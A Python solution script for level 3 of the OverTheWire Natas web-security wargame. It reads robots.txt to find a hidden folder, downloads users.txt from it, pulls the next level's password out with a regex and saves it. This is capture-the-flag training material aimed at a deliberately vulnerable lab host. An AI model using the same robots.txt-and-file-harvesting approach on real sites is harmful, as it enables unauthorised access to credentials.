import natas,requests,re,base64

URL='http://natas3.natas.labs.overthewire.org'
USER='natas3'
PASSWORD=natas.get_credential(USER)

def main():
    b64 = base64.b64encode('%s:%s' % (USER,PASSWORD))
    fldr = find_folder_name(b64)
    
    response = requests.get (
           '%s%susers.txt' % (URL,fldr),
           headers = {
               'Authorization':'Basic %s' % b64
           }
    )

    regex=r"^natas4:(\w+?)$"
    matches = re.finditer(regex, response.content, re.MULTILINE)
    password = None
    for match in matches:
        password = match.group(1)

    print('found password: %s' % password)
    print('adding to credentials file....')
    natas.save_credentials('natas4',password)
    print('done')

    return None


"""
this method checks URL/robots.txt for the folder name containing users.txt
"""
def find_folder_name(b64):
    response = requests.get (
            '%s/robots.txt' % URL,
            headers = {
                'Authorization':'Basic %s' % b64
            }
    )

    regex=r"^Disallow: (.+?)$"
    matches = re.finditer(regex,response.content,re.MULTILINE)
    for match in matches:
        return match.group(1)

    return None



if __name__=='__main__':
    main()
